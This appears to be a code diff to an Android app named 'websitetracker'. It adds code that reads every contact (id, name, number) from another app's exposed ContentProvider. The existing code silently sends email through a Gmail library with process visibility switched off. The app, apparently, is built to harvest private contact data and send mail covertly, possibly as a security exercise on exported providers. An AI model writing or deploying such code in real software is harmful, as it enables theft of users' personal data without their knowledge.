@@ -1,10 +1,14 @@
 package com.example.websitetracker
 
+import android.annotation.SuppressLint
+import android.content.ContentProviderClient
+import android.net.Uri
 import android.os.Bundle
 import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
 import com.creativityapps.gmailbackgroundlibrary.BackgroundMail.TYPE_PLAIN
 import com.creativityapps.gmailbackgroundlibrary.BackgroundMail.newBuilder
+
 
 /**
  * #license Copyright 2015 Yesid Lazaro
@@ -22,9 +26,31 @@ import com.creativityapps.gmailbackgroundlibrary.BackgroundMail.newBuilder
  */
 class MainActivity : AppCompatActivity() {
 
+    @SuppressLint("Range")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
+
+        // Look here how to get the info
+
+        // Get the right ContentProvider
+        val contactURI: Uri =
+            Uri.parse("content://com.example.contacts.provider.ContactContentProvider/contacts")
+        val contentResolver: ContentProviderClient? =
+            contentResolver.acquireContentProviderClient(contactURI)
+
+        if (contentResolver != null) {
+            //Here we get the contacts
+            var cursor = contentResolver.query(contactURI, null, null, null, null)
+            if (cursor != null && cursor.count > 0) {
+                while (cursor.moveToNext()) {
+                    val id = cursor.getString(cursor.getColumnIndex("contact_id"))
+                    val name = cursor.getString(cursor.getColumnIndex("name"))
+                    val number = cursor.getString(cursor.getColumnIndex("numbers"))
+                    Log.v("Contact : ", "Name : $name, Id :$id, Number : $number")
+                }
+            }
+        }
 
         /**
          * Creds
@@ -48,4 +74,6 @@ class MainActivity : AppCompatActivity() {
             .withProcessVisibility(false)
             .send()
     }
+
+
 }
